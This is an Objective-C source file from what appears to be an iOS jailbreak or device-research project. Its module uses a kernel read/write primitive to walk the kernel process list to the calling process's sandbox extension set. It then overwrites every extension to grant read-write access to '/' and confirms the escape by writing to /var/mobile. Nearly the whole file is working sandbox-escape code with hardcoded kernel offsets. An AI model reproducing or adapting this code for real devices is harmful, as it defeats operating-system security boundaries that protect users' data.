//
//  Lum1naSandboxUnpatch.m — P165 (see header).
//

#import "Lum1naSandboxUnpatch.h"
#import "Lum1naBoard.h"
#import "Lum1naKreadLane.h"
#import "LabDeviceProfile.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>

#define SBX_BUILD @"p165-sandbox-unpatch-v1"

/* filza27.2 sandbox_escape.m offsets (CrazyMind90 law), cross-checked against
   our LabKernelOffsets DB (proc_ro_ucred 0x28, ucred_cr_label 0x78) and the
   Dopamine libjailbreak ladder (same values). */
#define OFF_PROC_PROC_RO    0x18
#define OFF_UCRED_CR_LABEL  0x78
#define OFF_LABEL_SANDBOX   0x10
#define OFF_SANDBOX_EXT_SET 0x10
#define OFF_EXT_DATA        0x40
#define OFF_EXT_DATALEN     0x48
#define SBX_CHUNK 0x20
#define SBX_CLASS_NAME "com.apple.app-sandbox.read-write"

static BOOL g_fired = NO;

@implementation Lum1naSandboxUnpatch

+ (BOOL)hasFired { return g_fired; }

/// Kernel-band check derived from this boot's committed static base.
static BOOL kvalid(uint64_t v, uint64_t staticBase) {
    if (v < 0xFFFFFFFF00000000ULL) return NO;
    uint64_t band = staticBase ? (staticBase >> 40) : 0xFFFFFF;
    if (band && (v >> 40) != band) return NO;
    return YES;
}

static BOOL wrchunk(NSMutableString *o, uint64_t addr, const void *buf,
                    size_t len, NSString *what) {
    ssize_t w = Lum1naLaneKWriteBuf(addr, buf, len);
    if (w != (ssize_t)len) {
        [o appendFormat:@"[-] kwrite %@ @0x%llx — %zd/%zu bytes (lane refused)\n",
            what, (unsigned long long)addr, w, len];
        return NO;
    }
    return YES;
}

/* one ext header: path -> "/", hdr[+8]=1, hdr[+0x10]=-1 */
static BOOL patch_ext(NSMutableString *o, uint64_t ext, uint64_t staticBase) {
    uint64_t da = Lum1naLaneKRead64(ext + OFF_EXT_DATA);
    uint64_t dl = Lum1naLaneKRead64(ext + OFF_EXT_DATALEN);
    if (!kvalid(da, staticBase) || dl == 0 || dl > 0x10000) return NO;
    uint8_t pathbuf[SBX_CHUNK];
    memset(pathbuf, 0, sizeof pathbuf);
    pathbuf[0] = '/';
    if (!wrchunk(o, da, pathbuf, sizeof pathbuf, @"ext path")) return NO;

    /* live header copy via lane reads (32 bytes) */
    uint8_t hdrbuf[SBX_CHUNK];
    for (int q = 0; q < 4; q++) {
        uint64_t v = Lum1naLaneKRead64(ext + OFF_EXT_DATA + (uint64_t)q * 8);
        memcpy(hdrbuf + (size_t)q * 8, &v, 8);
    }
    uint64_t one = 1;
    uint64_t neg = 0xFFFFFFFFFFFFFFFFULL;
    memcpy(hdrbuf + 0x08, &one, 8);
    memcpy(hdrbuf + 0x10, &neg, 8);
    return wrchunk(o, ext + OFF_EXT_DATA, hdrbuf, sizeof hdrbuf, @"ext hdr");
}

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p165 sandbox unpatch — BUILD %@ ===\n", SBX_BUILD];

    Lum1naBoard *b = [Lum1naBoard shared];
    if (!b.hasKread || b.kbase == 0) {
        [o appendString:@"[-] HOLD — no live kread receipt this process (kread32==0xfeedfacf).\n"];
        [o appendString:@"[-] The walk without KRW = kernel-corruption roulette, not a bypass. EXIT.\n"];
        return o;
    }
    if (!Lum1naLaneLive()) {
        [o appendString:@"[-] no live lane (socketkrw/libkrw/cs2core) — EXIT.\n"];
        return o;
    }
    uint64_t staticBase = b.staticBase;
    [o appendFormat:@"[+] lane=%s hasKread=YES kbase=0x%llx\n",
        Lum1naLaneName(), (unsigned long long)b.kbase];

    /* 1. self proc via the proven kernproc list walk (P094 law) */
    uint64_t kernproc = [b provenKernproc];
    if (!kvalid(kernproc, staticBase)) {
        [o appendString:@"[-] no proven kernproc on the board — P094 first. EXIT.\n"];
        return o;
    }
    int mypid = (int)getpid();
    uint64_t selfp = 0;
    for (int i = 0; i < 4096; i++) {
        uint32_t pid = (uint32_t)Lum1naLaneKRead32(kernproc + 0x60);  /* p_pid */
        if (pid == (uint32_t)mypid) { selfp = kernproc; break; }
        uint64_t next = Lum1naLaneKRead64(kernproc);                 /* p_list.le_next */
        if (!kvalid(next, staticBase)) break;
        kernproc = next;
    }
    if (!selfp) {
        [o appendString:@"[-] self proc not found in the kernproc walk — EXIT.\n"];
        return o;
    }
    [o appendFormat:@"[+] self proc 0x%llx (pid %d)\n",
        (unsigned long long)selfp, mypid];

    /* 2. walk to ext_set with a kernel-band check at every hop */
    uint64_t proc_ro = Lum1naLaneKRead64(selfp + OFF_PROC_PROC_RO);
    if (!kvalid(proc_ro, staticBase)) {
        [o appendFormat:@"[-] proc_ro 0x%llx invalid for this band — EXIT.\n",
            (unsigned long long)proc_ro];
        return o;
    }
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t c = Lum1naLaneKRead64(proc_ro + off);
        if (!kvalid(c, staticBase)) continue;
        uint64_t lbl = Lum1naLaneKRead64(c + OFF_UCRED_CR_LABEL);
        if (!kvalid(lbl, staticBase)) continue;
        uint64_t sbx = Lum1naLaneKRead64(lbl + OFF_LABEL_SANDBOX);
        if (kvalid(sbx, staticBase)) { ucred = c; break; }
    }
    if (!ucred) {
        [o appendString:@"[-] ucred not found in the proc_ro scan — EXIT.\n"];
        return o;
    }
    uint64_t label = Lum1naLaneKRead64(ucred + OFF_UCRED_CR_LABEL);
    uint64_t sandbox = Lum1naLaneKRead64(label + OFF_LABEL_SANDBOX);
    uint64_t extSet = Lum1naLaneKRead64(sandbox + OFF_SANDBOX_EXT_SET);
    if (!kvalid(extSet, staticBase)) {
        [o appendString:@"[-] ext_set invalid — EXIT.\n"];
        return o;
    }
    [o appendFormat:@"[+] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx\n",
        (unsigned long long)proc_ro, (unsigned long long)ucred,
        (unsigned long long)label, (unsigned long long)sandbox,
        (unsigned long long)extSet];

    /* 3. patch every extension chain in the 16 hash slots */
    int patched = 0, failed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = Lum1naLaneKRead64(extSet + (uint64_t)s * 8);
        if (!kvalid(hdr, staticBase)) continue;
        for (int hop = 0; hop < 64; hop++) {
            uint64_t ext = Lum1naLaneKRead64(hdr + 0x8);
            if (!kvalid(ext, staticBase)) break;
            if (patch_ext(o, ext, staticBase)) patched++; else failed++;
            uint64_t next = Lum1naLaneKRead64(hdr);
            if (!kvalid(next, staticBase)) break;
            hdr = next;
        }
    }
    [o appendFormat:@"[*] patched %d extensions, %d write failures\n", patched, failed];

    /* 4. set the RW class on the first live header and copy it into empty slots */
    static const char rw[SBX_CHUNK] = SBX_CLASS_NAME;   /* exactly 32B with NUL */
    int classed = 0, filled = 0;
    uint64_t srcHdr = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = Lum1naLaneKRead64(extSet + (uint64_t)s * 8);
        if (!kvalid(hdr, staticBase)) continue;
        if (!srcHdr) srcHdr = hdr;
        uint64_t da = Lum1naLaneKRead64(Lum1naLaneKRead64(hdr + 0x8) + OFF_EXT_DATA);
        if (!kvalid(da, staticBase)) continue;
        if (!wrchunk(o, da + 0x20, rw, sizeof rw, @"rw class")) continue;
        if (!wrchunk(o, da + 0x40, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", SBX_CHUNK, @"cls fill")) continue;
        uint8_t hb[SBX_CHUNK];
        for (int q = 0; q < 4; q++) {
            uint64_t v = Lum1naLaneKRead64(hdr + (uint64_t)q * 8);
            memcpy(hb + (size_t)q * 8, &v, 8);
        }
        uint64_t clsAddr = da + 0x20;
        memcpy(hb + 0x10, &clsAddr, 8);
        if (wrchunk(o, hdr, hb, sizeof hb, @"hdr cls")) classed++;
    }
    if (srcHdr) {
        for (int s = 0; s < 16; s++) {
            uint64_t slot = extSet + (uint64_t)s * 8;
            uint64_t cur = Lum1naLaneKRead64(slot);
            if (!kvalid(cur, staticBase)) {
                if (Lum1naLaneKWrite64(slot, srcHdr)) filled++;
            }
        }
    }
    [o appendFormat:@"[*] classed %d headers, filled %d empty slots\n", classed, filled];

    /* 5. verify: can THIS process write /var/mobile? */
    int fd = open("/var/mobile/.lum1na_sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd);
        unlink("/var/mobile/.lum1na_sbx_test");
        [o appendString:@"[+] *** SANDBOX UNPATCHED — /var/mobile writable from this process ***\n"];
        g_fired = YES;
        [b recordEvent:@"sandbox" kind:@"unpatched"
                detail:[NSString stringWithFormat:@"patched=%d classed=%d filled=%d",
                        patched, classed, filled]
                source:@"p165"];
    } else {
        [o appendFormat:@"[-] verify failed errno=%d (%s) — patch did not hold\n",
            errno, strerror(errno)];
    }
    [o appendFormat:@"=== p165 end ===\n"];
    return o;
}

@end
